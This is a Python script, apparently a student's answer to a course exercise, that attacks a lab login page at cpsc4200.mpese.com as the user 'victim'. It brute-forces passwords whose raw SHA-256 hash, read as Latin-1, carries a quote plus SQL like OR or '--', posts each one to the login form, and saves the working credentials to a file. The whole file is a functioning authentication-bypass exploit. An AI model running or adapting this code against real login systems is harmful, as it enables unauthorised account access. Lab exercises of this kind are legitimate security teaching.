from hashlib import sha256
import requests
import urllib.parse
import string
import random
import time

def test_password(password, target_url="http://cpsc4200.mpese.com/sqlinject/2", username="victim"):
    """Test if a password works to log in"""
    data = {
        "username": username,
        "password": password
    }
    
    response = requests.post(target_url, data=data)
    return "Login successful" in response.text, response, data

def find_injectable_hash(max_attempts=100000):
    """
    Find a password that produces a SHA256 hash containing SQL injection patterns
    when interpreted as Latin-1 text
    """
    print("Searching for a password that produces an injectable hash...")
    charset = string.ascii_letters + string.digits + string.punctuation
    
    count = 0
    start_time = time.time()
    
    while count < max_attempts:
        count += 1
        if count % 1000 == 0:
            elapsed = time.time() - start_time
            rate = count / elapsed if elapsed > 0 else 0
            print(f"Tried {count} passwords in {elapsed:.1f}s ({rate:.1f}/s)")
        
        # Generate a random password
        password = ''.join(random.choices(charset, k=8))
        
        # Calculate the hash as the server would
        prefix = "bungle-"
        password_bytes = (prefix + password).encode("latin-1")
        digest = sha256(password_bytes).digest()
        
        # Convert to Latin-1 as the server does
        hash_str = digest.decode("latin-1", errors="replace")
        
        # Look for a single quote to break out of the SQL string
        if "'" in hash_str:
            quote_pos = hash_str.index("'")
            
            # Get the part after the quote
            rest = hash_str[quote_pos+1:]
            
            # Look for useful SQL patterns
            if " OR " in rest or "--" in rest or "OR " in rest or " OR" in rest or "#" in rest:
                print(f"\nFound potentially injectable password: {password}")
                print(f"Hash contains quote at position {quote_pos}")
                print(f"Characters after quote: {repr(rest[:20])}")
                
                # Test if this password actually works
                success, response, data = test_password(password)
                if success:
                    print("\n✓ LOGIN SUCCESSFUL!")
                    print(f"Password: {password}")
                    return password, data
                else:
                    print("× Login failed. Hash may not produce viable SQL injection.")
    
    print(f"\nNo successful injection found after {max_attempts} attempts.")
    return None, None

def main():
    target_url = "http://cpsc4200.mpese.com/sqlinject/2"
    username = "victim"
    
    print("SHA256 SQL Injection Exploit")
    print("============================")
    
    # Find a password that produces an injectable hash
    password, data = find_injectable_hash()
    
    if password:
        # Save the URL-encoded credentials to the required file
        encoded_data = urllib.parse.urlencode(data)
        with open("sql 2.txt", "w") as f:
            f.write(encoded_data)
        print(f"\nSaved exploit to sql 2.txt: {encoded_data}")
    else:
        print("\nFailed to find a working exploit. Try increasing max_attempts.")

if __name__ == "__main__":
    main()